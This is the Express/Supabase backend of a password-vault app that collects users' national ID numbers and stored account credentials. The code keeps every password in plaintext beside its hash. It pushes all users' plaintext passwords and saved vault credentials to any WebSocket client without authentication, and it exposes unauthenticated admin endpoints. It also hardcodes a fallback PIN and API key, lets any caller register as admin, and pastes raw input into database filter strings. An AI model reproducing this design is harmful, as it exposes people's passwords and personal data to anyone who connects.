const express = require('express');
const cors = require('cors');
const bcrypt = require('bcryptjs');
const path = require('path');
const http = require('http');
const WebSocket = require('ws');
const { createClient } = require('@supabase/supabase-js');

// dotenv রিকোয়ার ও কনফিগার করা হলো যাতে .env ফাইল থেকে সঠিক পিন রিড হতে পারে
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// ==========================================
// Supabase Client Initialization
// ==========================================
const SUPABASE_URL = process.env.SUPABASE_URL || 'https://vgjsoicsmmzahhsuworg.supabase.co';
const SUPABASE_KEY = process.env.SUPABASE_KEY || 'sb_publishable_NkMibVnz7Vt6CAHuSTaQZw_zpUFGNsv';

const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

// HTTP Server & WebSocket Server Integration
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// Helper: Broadcast Live Data to All Connected Admin Clients
const broadcastUsersData = async () => {
  try {
    const { data: users, error: userError } = await supabase.from('users').select('*');
    const { data: credentials, error: credError } = await supabase.from('credentials').select('*');

    if (userError || credError) {
      console.error('Error fetching broadcast data from Supabase:', userError || credError);
      return;
    }

    const combinedData = (users || []).map(user => {
      const uId = String(user.userId || user.id);
      const userRecords = (credentials || []).filter(c => 
        String(c.userId) === uId || String(c.user_id) === uId
      );

      const displayPassword = user.plainPassword || user.password || '******';

      return {
        ...user,
        userId: uId,
        id: uId,
        userName: user.fullName || user.userName || 'N/A',
        emailPhone: user.email || user.phoneNumber || user.emailPhone || 'N/A',
        password: displayPassword,
        plainPassword: displayPassword,
        status: user.status || 'active',
        vaultRecords: userRecords
      };
    });

    const payload = JSON.stringify({
      type: 'USERS_UPDATE',
      data: combinedData
    });

    wss.clients.forEach(client => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(payload);
      }
    });
  } catch (err) {
    console.error('Error broadcasting websocket data:', err);
  }
};

// Handle WebSocket Connection
wss.on('connection', (ws) => {
  console.log('⚡ Admin connected via Live WebSocket');
});

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Disable Caching Middleware
app.use((req, res, next) => {
  res.header('Cache-Control', 'private, no-cache, no-store, must-revalidate');
  res.header('Expires', '-1');
  res.header('Pragma', 'no-cache');
  next();
});

// ==========================================
// Health Check Route for Render
// ==========================================
app.get('/health', (req, res) => {
  res.status(200).send('OK');
});

// ==========================================
// Serve Static Files (Updated: 'www' removed)
// ==========================================
app.use(express.static(path.join(__dirname)));
app.use('/admin', express.static(path.join(__dirname, 'safepass-vault-admin')));
app.use(express.static(path.join(__dirname, 'safepass-vault-admin')));

// 10-Digit Unique User ID Generator
const generate10DigitId = () => {
  return Math.floor(1000000000 + Math.random() * 9000000000).toString();
};

// -----------------------------------------------------------------------------
// HTML Page Routes (Reading directly from root directory)
// -----------------------------------------------------------------------------

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/login.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/register.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'register.html'));
});

app.get('/dashboard.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'dashboard.html'));
});

app.get('/user.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'user.html'));
});

app.get('/admin.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'safepass-vault-admin', 'admin.html'));
});

app.get('/admin-login.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'safepass-vault-admin', 'admin-login.html'));
});

// -----------------------------------------------------------------------------
// API Routes
// -----------------------------------------------------------------------------

// System Owner PIN Verification Endpoint
app.post('/api/verify-owner-pin', (req, res) => {
  const { enteredPin } = req.body;

  const correctOwnerPin = String(process.env.ADMIN_SECRET_PIN || process.env.OWNER_SECRET_PIN || "789456").trim();
  const cleanEnteredPin = String(enteredPin || "").trim();

  if (cleanEnteredPin === correctOwnerPin) {
    return res.status(200).json({ success: true, message: 'PIN verified successfully!' });
  } else {
    return res.status(400).json({ success: false, message: 'Invalid PIN!' });
  }
});

// A. User Registration Endpoint
app.post('/api/register', async (req, res) => {
  try {
    const { fullName, nidNumber, phoneNumber, email, gender, dob, bloodGroup, presentAddress, password, createdBy } = req.body;

    const bdPhoneRegex = /^01[3-9]\d{8}$/;
    if (phoneNumber && !bdPhoneRegex.test(phoneNumber)) {
      return res.status(400).json({ 
        success: false, 
        message: 'Invalid phone number! Must be an 11-digit Bangladeshi number starting with 01.' 
      });
    }

    const { data: existingUsers, error: checkError } = await supabase.from('users').select('*');
    if (!checkError && existingUsers) {
      const duplicate = existingUsers.find(u => 
        (email && u.email === email) || 
        (phoneNumber && u.phoneNumber === phoneNumber) || 
        (nidNumber && u.nidNumber === nidNumber)
      );

      if (duplicate) {
        if (createdBy !== 'admin') {
          let msg = 'This email address is already registered!';
          if (duplicate.phoneNumber === phoneNumber) msg = 'This phone number is already registered!';
          if (duplicate.nidNumber === nidNumber) msg = 'This NID number is already registered!';
          return res.status(400).json({ success: false, message: msg });
        }
      }
    }

    const cleanPassword = String(password || '');
    const hashedPassword = await bcrypt.hash(cleanPassword, 10);
    const uniqueUserId = generate10DigitId();

    const userRole = (createdBy === 'admin') ? 'admin' : 'user';

    const newUser = {
      userId: String(uniqueUserId),
      fullName: fullName || '',
      userName: fullName || '',
      nidNumber: nidNumber || '',
      phoneNumber: phoneNumber || '',
      email: email || '',
      emailPhone: email || phoneNumber || '',
      gender: gender || '',
      dob: dob || '',
      bloodGroup: bloodGroup || '',
      presentAddress: presentAddress || '',
      password: cleanPassword,
      plainPassword: cleanPassword,
      hashedPassword: hashedPassword,
      status: 'active',
      resetRequested: false,
      resetApproved: false,
      createdBy: createdBy === 'admin' ? 'admin' : 'user',
      role: userRole
    };

    const { error: insertError } = await supabase.from('users').insert([newUser]);
    if (insertError) throw insertError;

    await broadcastUsersData();

    res.status(201).json({ 
      success: true, 
      message: 'User registered successfully!',
      userId: uniqueUserId 
    });
  } catch (error) {
    console.error('Registration Error:', error);
    res.status(500).json({ success: false, message: error.message || 'Internal server error occurred.' });
  }
});

// B. User Login Endpoint
app.post('/api/login', async (req, res) => {
  try {
    const { emailOrPhone, password, userId } = req.body;

    const { data: users, error } = await supabase.from('users').select('*');
    if (error) throw error;

    const matchedUsers = (users || []).filter(u => {
      const matchesIdentifier = (
        (userId && String(u.userId) === String(userId)) ||
        (emailOrPhone && (u.email === emailOrPhone || u.phoneNumber === emailOrPhone || String(u.userId) === String(emailOrPhone) || u.emailPhone === emailOrPhone))
      );
      const hasPassword = u.hashedPassword || u.plainPassword || u.password;
      return matchesIdentifier && hasPassword;
    });

    if (matchedUsers.length === 0) {
      return res.status(400).json({ success: false, message: 'Invalid Credentials!' });
    }

    let user = null;
    let isMatch = false;
    const inputPass = String(password || '');

    for (const u of matchedUsers) {
      let matched = false;
      if (u.hashedPassword) {
        matched = await bcrypt.compare(inputPass, u.hashedPassword);
      }
      if (!matched && (u.plainPassword || u.password)) {
        matched = (u.plainPassword === inputPass || u.password === inputPass);
      }

      if (matched) {
        user = u;
        isMatch = true;
        break;
      }
    }

    if (!isMatch || !user) {
      return res.status(400).json({ success: false, message: 'Invalid Credentials!' });
    }

    if (user.status && user.status.toLowerCase() !== 'active') {
      return res.status(403).json({ success: false, message: `Account is ${user.status.toUpperCase()}! Contact Admin.` });
    }

    const targetUserId = String(user.userId || user.id);

    res.status(200).json({
      success: true,
      message: 'Login successful!',
      user: {
        userId: targetUserId,
        id: targetUserId,
        _id: targetUserId,
        fullName: user.fullName || user.userName || 'User',
        userName: user.fullName || user.userName || 'User',
        email: user.email || '',
        phoneNumber: user.phoneNumber || '',
        nidNumber: user.nidNumber || '',
        gender: user.gender || '',
        dob: user.dob || '',
        bloodGroup: user.bloodGroup || '',
        presentAddress: user.presentAddress || '',
        emailPhone: user.emailPhone || user.email || user.phoneNumber,
        role: user.role || 'user'
      }
    });
  } catch (error) {
    console.error('Login Error:', error);
    res.status(500).json({ success: false, message: error.message || 'Internal server error occurred.' });
  }
});

// C. Check Current Real-Time User Status
app.get('/api/user/status/:userId', async (req, res) => {
  try {
    const { userId } = req.params;

    const { data: user, error } = await supabase
      .from('users')
      .select('*')
      .or(`userId.eq.${userId},id.eq.${userId}`)
      .maybeSingle();

    if (error) throw error;
    if (!user) {
      return res.status(404).json({ success: false, message: 'User not found' });
    }

    res.status(200).json({
      success: true,
      status: user.status ? user.status.toLowerCase() : 'active'
    });
  } catch (error) {
    console.error('Status Check Error:', error);
    res.status(200).json({ success: true, status: 'active' });
  }
});

// D. Password Reset Check Status Endpoint
app.get('/api/check-reset-status', async (req, res) => {
  try {
    const { identifier } = req.query;
    if (!identifier) {
      return res.status(400).json({ success: false, message: 'Identifier is required.' });
    }

    const { data: user, error } = await supabase
      .from('users')
      .select('userId, id, resetApproved')
      .or(`email.eq.${identifier},phoneNumber.eq.${identifier},userId.eq.${identifier}`)
      .maybeSingle();

    if (error) throw error;

    if (user && user.resetApproved) {
      return res.status(200).json({
        success: true,
        resetApproved: true,
        userId: String(user.userId || user.id)
      });
    }

    res.status(200).json({ success: true, resetApproved: false });
  } catch (error) {
    console.error('Check Reset Status Error:', error);
    res.status(500).json({ success: false, message: 'Failed to check reset status.' });
  }
});

// E. Request Password Reset Endpoint
app.post('/api/admin/request-password-reset', async (req, res) => {
  try {
    const { identifier } = req.body;
    if (!identifier) {
      return res.status(400).json({ success: false, message: 'Identifier is required.' });
    }

    const { data: user, error: findError } = await supabase
      .from('users')
      .select('userId, id')
      .or(`email.eq.${identifier},phoneNumber.eq.${identifier},userId.eq.${identifier}`)
      .maybeSingle();

    if (findError) throw findError;
    if (!user) {
      return res.status(404).json({ success: false, message: 'This Email, Phone Number, or User ID is not registered.' });
    }

    const targetId = user.userId || user.id;

    const { error: updateError } = await supabase
      .from('users')
      .update({
        resetRequested: true,
        resetApproved: false,
        resetRequestedAt: new Date().toISOString()
      })
      .or(`userId.eq.${targetId},id.eq.${targetId}`);

    if (updateError) throw updateError;

    await broadcastUsersData();

    res.status(200).json({ success: true, message: 'Password reset request sent to Admin successfully.' });
  } catch (error) {
    console.error('Password Reset Request Error:', error);
    res.status(500).json({ success: false, message: 'Failed to process request.' });
  }
});

// F. Save Credential Endpoint
app.post('/api/save-credential', async (req, res) => {
  try {
    const credentialData = req.body;
    const targetUserId = String(credentialData.userId || credentialData.user_id || '');

    const newRecord = {
      userId: targetUserId,
      user_id: targetUserId,
      platform: credentialData.platform || credentialData.title || '',
      identifier: credentialData.identifier || credentialData.username || credentialData.email || credentialData.phone || '',
      password: credentialData.password || credentialData.secret || ''
    };

    const { data, error } = await supabase
      .from('credentials')
      .insert([newRecord])
      .select()
      .single();

    if (error) throw error;

    await broadcastUsersData();

    res.status(201).json({ success: true, message: 'Credential saved successfully!', credential: data });
  } catch (error) {
    console.error('Save Credential Error:', error);
    res.status(500).json({ success: false, message: 'Failed to save credential.' });
  }
});

// G. Admin APIs
app.get('/api/admin/all-users', async (req, res) => {
  try {
    const { data: users, error: uError } = await supabase
      .from('users')
      .select('*')
      .eq('createdBy', 'admin'); 

    const { data: credentials, error: cError } = await supabase.from('credentials').select('*');

    if (uError || cError) throw uError || cError;

    const combinedData = (users || []).map(user => {
      const uId = String(user.userId || user.id);
      const userRecords = (credentials || []).filter(c => 
        String(c.userId) === uId || String(c.user_id) === uId
      );

      const displayPassword = user.plainPassword || user.password || '******';

      return {
        ...user,
        userId: uId,
        id: uId,
        userName: user.fullName || user.userName || 'N/A',
        emailPhone: user.email || user.phoneNumber || user.emailPhone || 'N/A',
        password: displayPassword,
        plainPassword: displayPassword,
        status: user.status || 'active',
        vaultRecords: userRecords
      };
    });

    res.status(200).json(combinedData);
  } catch (error) {
    console.error('Fetch Users Error:', error);
    res.status(500).json({ success: false, message: 'Failed to fetch user records.' });
  }
});

app.get('/api/admin/user/:userId', async (req, res) => {
  try {
    const { userId } = req.params;

    const { data: user, error: uError } = await supabase
      .from('users')
      .select('*')
      .or(`userId.eq.${userId},id.eq.${userId}`)
      .maybeSingle();

    if (uError) throw uError;
    if (!user) {
      return res.status(404).json({ success: false, message: 'User not found' });
    }

    const uId = String(user.userId || user.id);

    const { data: credentials, error: cError } = await supabase
      .from('credentials')
      .select('*')
      .or(`userId.eq.${uId},user_id.eq.${uId}`);

    if (cError) throw cError;

    res.status(200).json({
      ...user,
      userId: uId,
      id: uId,
      password: user.plainPassword || user.password || '******',
      vaultRecords: credentials || []
    });
  } catch (error) {
    console.error('Fetch Single User Error:', error);
    res.status(500).json({ success: false, message: 'Failed to fetch user details.' });
  }
});

app.get('/api/admin/all-data', async (req, res) => {
  try {
    const { userId } = req.query;
    let query = supabase.from('credentials').select('*');

    if (userId) {
      const uId = String(userId).trim();
      query = query.or(`userId.eq.${uId},user_id.eq.${uId}`);
    }

    const { data: credentials, error } = await query;
    if (error) throw error;

    res.status(200).json(credentials || []);
  } catch (error) {
    console.error('Fetch Data Error:', error);
    res.status(500).json({ success: false, message: 'Failed to fetch vault records.' });
  }
});

// H. Update Credential Endpoint
app.put('/api/update-credential/:id', async (req, res) => {
  try {
    const { id } = req.params;
    const updatedData = req.body;

    const { error } = await supabase
      .from('credentials')
      .update(updatedData)
      .eq('id', id);

    if (error) throw error;

    await broadcastUsersData();

    res.status(200).json({ success: true, message: 'Credential updated successfully!' });
  } catch (error) {
    console.error('Update Error:', error);
    res.status(500).json({ success: false, message: 'Failed to update credential.' });
  }
});

// I. Delete Credential Endpoint
app.delete('/api/delete-credential/:id', async (req, res) => {
  try {
    const { id } = req.params;

    const { error } = await supabase
      .from('credentials')
      .delete()
      .eq('id', id);

    if (error) throw error;

    await broadcastUsersData();

    res.status(200).json({ success: true, message: 'Credential deleted successfully!' });
  } catch (error) {
    console.error('Delete Error:', error);
    res.status(500).json({ success: false, message: 'Failed to delete credential.' });
  }
});

app.post('/api/delete-credential', async (req, res) => {
  try {
    const { id, _id } = req.body;
    const targetId = String(_id || id);

    const { error } = await supabase
      .from('credentials')
      .delete()
      .eq('id', targetId);

    if (error) throw error;

    await broadcastUsersData();

    res.status(200).json({ success: true, message: 'Credential deleted successfully!' });
  } catch (error) {
    console.error('Delete Fallback Error:', error);
    res.status(500).json({ success: false, message: 'Failed to delete credential.' });
  }
});

// J. Admin API: Update User Details, Status, Password
app.put('/api/admin/update-user/:userId', async (req, res) => {
  try {
    const { userId } = req.params;
    const { fullName, email, phoneNumber, password, status, resetApproved, resetRequested } = req.body;

    const updates = {};
    if (fullName) {
      updates.fullName = fullName;
      updates.userName = fullName;
    }
    if (email) updates.email = email;
    if (phoneNumber) updates.phoneNumber = phoneNumber;
    if (status) updates.status = status.toLowerCase();

    if (resetApproved !== undefined) updates.resetApproved = resetApproved;
    if (resetRequested !== undefined) updates.resetRequested = resetRequested;

    if (password && String(password).trim() !== '') {
      const cleanPass = String(password).trim();
      updates.password = cleanPass;
      updates.plainPassword = cleanPass;
      updates.hashedPassword = await bcrypt.hash(cleanPass, 10);
    }

    const { error } = await supabase
      .from('users')
      .update(updates)
      .or(`userId.eq.${userId},id.eq.${userId},email.eq.${userId},phoneNumber.eq.${userId}`);

    if (error) throw error;

    await broadcastUsersData();

    res.status(200).json({ success: true, message: 'User details updated successfully!' });
  } catch (error) {
    console.error('Update User Error:', error);
    res.status(500).json({ success: false, message: 'Failed to update user details.' });
  }
});

// K. Admin API: Delete User and User's Vault Credentials
app.delete('/api/admin/delete-user/:userId', async (req, res) => {
  try {
    const { userId } = req.params;

    const { error: userErr } = await supabase
      .from('users')
      .delete()
      .or(`userId.eq.${userId},id.eq.${userId}`);

    if (userErr) throw userErr;

    const { error: credErr } = await supabase
      .from('credentials')
      .delete()
      .or(`userId.eq.${userId},user_id.eq.${userId}`);

    if (credErr) throw credErr;

    await broadcastUsersData();

    res.status(200).json({ success: true, message: 'User and associated data deleted successfully!' });
  } catch (error) {
    console.error('Delete User Error:', error);
    res.status(500).json({ success: false, message: 'Failed to delete user.' });
  }
});

// Server Listener with '0.0.0.0' for Render binding compatibility
server.listen(PORT, '0.0.0.0', () => {
  console.log("=================================================");
  console.log(`Supabase Real-Time Live Server Running Successfully!`);
  console.log(`URL: http://localhost:${PORT}/login.html`);
  console.log("=================================================");
});